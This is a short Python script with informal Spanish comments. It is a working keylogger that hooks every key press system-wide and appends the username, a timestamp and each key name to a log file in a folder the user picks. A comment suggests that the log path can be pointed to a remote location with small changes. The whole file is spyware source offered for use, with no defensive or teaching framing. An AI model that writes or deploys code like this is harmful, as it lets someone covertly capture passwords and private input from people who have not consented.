import keyboard  # NOTA:Para poder importar keyboard ocupas instalar la dependencia pip install keyboard
import os  # ya luego se importa el sistema :v
from getpass import (
    getuser,
)  # importas esto tambien, para esto no se ocupa instalar nada, esto nos servira para obtener el nombre de usuario del sistema
import time  # importas el tiempo para ver cuando se pulsaron las teclas y asi ps :v


def WriteToFile(filename, data, folder_path):  # se crea la funcion
    # Crea la ruta completa del archivo
    file_path = os.path.join(folder_path, filename)

    # Escribe los datos al archivo especificado
    with open(file_path, "a") as file:
        file.write(data)


def Pressed(
    event, filename, folder_path
):  # funcion para detectar cuando las teclas son presionadas por el usuario
    # Detecta cuando una tecla es presionada
    if event.event_type == keyboard.KEY_DOWN:
        key_name = event.name
        data = f"{getuser()} - {os.path.basename(filename)} - {time.asctime()}: {key_name}\n"
        WriteToFile("logs.txt", data, folder_path)


filename = "nombre_del_archivo.txt"  # Reemplaza con el nombre que desees
folder_path = r"C:\Users\ruta de tu folder donde quieres guardar el archivo log.txt para ver todo lo que se ah pulsado"  # Ruta deseada donde quieres que se guarde tu archivo con el historial de teclas pulsadas (aqui en vez de poner una ruta local puedes poner una ruta remota moviendo unas cuantas lineas de codigo)
# Configura el detector de eventos para llamar a la función Pressed cuando una tecla es presionada

keyboard.on_press(callback=lambda event: Pressed(event, filename, folder_path))
# Hace que el programa espere indefinidamente hasta que se presiona una tecla
keyboard.wait()
